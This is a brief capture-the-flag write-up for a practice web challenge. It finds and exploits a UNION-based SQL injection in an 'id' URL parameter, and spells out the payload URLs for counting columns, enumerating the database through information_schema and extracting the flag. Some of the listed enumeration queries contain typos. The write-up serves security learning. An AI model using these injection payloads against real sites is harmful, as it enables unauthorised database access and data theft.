The site given seems to be hackable as the parameter in URL `id` is controlable.
It's reasonable to suspect that there may be a SQL injection vulnerability .

At first,Getting the number of columns 
```
https://hackme.inndy.tw/gb/?mod=read&id=-1 UNION SELECT 1,2,3,4 -- -
```
Obviously,Union-based injection technique works. 

Check the version of Database used.It's `MySQL 5.7.34` (replace any number excluding 1 after the `union select` of payload above to `version()` )
So, `information_shema` is available.

* Get database list: `SELECT schema_name FROM information_schemata `
* Get table list from a database: `SELECT table_name FROM information_schema.tables where table_schema=DATABASE`
* Get column list from a table : `SELECT column_name FROM information_schema.columns where table_schema=DATABASE`

Eventually.

```
https://hackme.inndy.tw/gb/?mod=read&id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='g8' -- -

https://hackme.inndy.tw/gb/?mod=read&id=-1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='flag' limit 1,1 -- -

https://hackme.inndy.tw/gb/?mod=read&id=-1 UNION SELECT 1,flag,3,4 FROM g8.flag -- - (A shit)

https://hackme.inndy.tw/gb/?mod=read&id=-1 UNION SELECT 1,flag,3,4 FROM g8.flag limit 1,2 -- - (The correct one)
```

Oh,BTW. It's more efficient by using `SQLmap`. 



